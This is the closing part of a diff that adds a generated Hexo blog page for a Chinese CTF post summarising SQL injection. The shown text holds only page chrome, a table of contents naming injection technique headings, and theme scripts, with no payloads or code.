+</code></pre>
+<p>原文链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzY0MTE4MTkzL2FydGljbGUvZGV0YWlscy8xMjUxMDQxMDI=">https://blog.csdn.net/m0_64118193/article/details/125104102</span></p>
+
+      <div class="tags">
+          <a href="/tags/ctf/" rel="tag"><i class="ic i-tag"></i> ctf</a>
+          <a href="/tags/%E6%80%BB%E7%BB%93/" rel="tag"><i class="ic i-tag"></i> 总结</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-01-19 13:30:02" itemprop="dateModified" datetime="2023-01-19T13:30:02+08:00">2023-01-19</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="zhu 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="zhu 支付宝">
+        <p>支付宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>zhu <i class="ic i-at"><em>@</em></i>zhu
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/01/18/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="sql注入总结">http://example.com/2023/01/18/sql注入总结/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/01/14/ctfer%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7kali/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclffsa1cj20zk0m811l.jpg" title="ctfer必备工具kali">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>ctfer必备工具kali</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.</span> <span class="toc-text">做题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEsql%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">寻找sql注入位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">判断漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">按注入点分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E5%8C%BA%E5%88%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">按提交方式区分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E9%A1%B5%E9%9D%A2%E6%89%A7%E8%A1%8C%E5%8F%8D%E9%A6%88%E5%8C%BA%E5%88%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">按页面执行反馈区分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.</span> <span class="toc-text">sql注入常用语句</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by-%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">2.7.</span> <span class="toc-text">order by 后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%BB%E8%A6%81%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.8.</span> <span class="toc-text">总结主要查询语句</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="zhu"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">zhu</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">11</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">6</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E5%89%8D10%E9%A2%98%EF%BC%88%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F%EF%BC%89/" title="攻防世界web前10题（引导模式）">攻防世界web前10题（引导模式）</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/14/ctfer%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7kali/" title="ctfer必备工具kali">ctfer必备工具kali</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/09/%E5%9B%BE%E7%89%87/" title="图片">图片</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/10/%E5%AD%97%E7%AC%A6%E8%BD%AC%E5%8C%96%E4%B8%BAurl%E5%80%BC/" title="字符转化为url值">字符转化为url值</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/09/tupian/" title="tupian">tupian</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/18/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="sql注入总结">sql注入总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/07/%E2%80%9Dtitle%E2%80%9C/" title="发表博客">发表博客</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/09/%E7%88%B1%E5%BF%83/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/07/my-first-blog/" title="我爱伍雪仪">我爱伍雪仪</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/07/%E5%8D%9A%E5%AE%A2%E5%90%8D%E5%AD%97/" title="Hello World">Hello World</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">zhu @ ZPY</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/01/18/sql注入总结/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
